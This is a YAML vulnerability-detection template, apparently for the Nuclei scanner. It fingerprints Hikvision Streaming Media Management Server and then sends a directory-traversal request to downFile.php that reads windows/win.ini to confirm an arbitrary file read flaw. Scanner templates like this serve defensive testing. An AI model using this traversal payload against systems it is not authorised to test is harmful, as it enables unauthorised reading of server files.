id: poc-yaml-hikvision-streaming-media-anyfile-read
info:
  name: Hikvision Streaming Media Management Server Arbitrary File Read Vulnerability
  author: ProjectDiscoveryAI
  severity: high
  tags: directory-traversal
  description: |
    This template detects an arbitrary file read vulnerability in Hikvision Streaming Media Management Server.

flow: http(1) && http(2)

http:
  - id: check-server
    method: GET
    path:
      - "{{BaseURL}}/"
    matchers-condition: or
    matchers:
      - type: word
        part: body
        words:
          - "<TITLE>流媒体管理服务器</TITLE>"
      - type: word
        part: body
        words:
          - "Video Transmission Management Server"

  - id: check-file-read
    method: GET
    path:
      - "{{BaseURL}}/systemLog/downFile.php?fileName=../../../../../../../../../../../../../../../windows/win.ini"
    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - "bit app support"
          - "[files]"
      - type: word
        part: body
        negative: true
        words:
          - "<"
      - type: word
        part: header
        words:
          - "filename=../../../../../../../../../../../../../../../windows/win.ini"
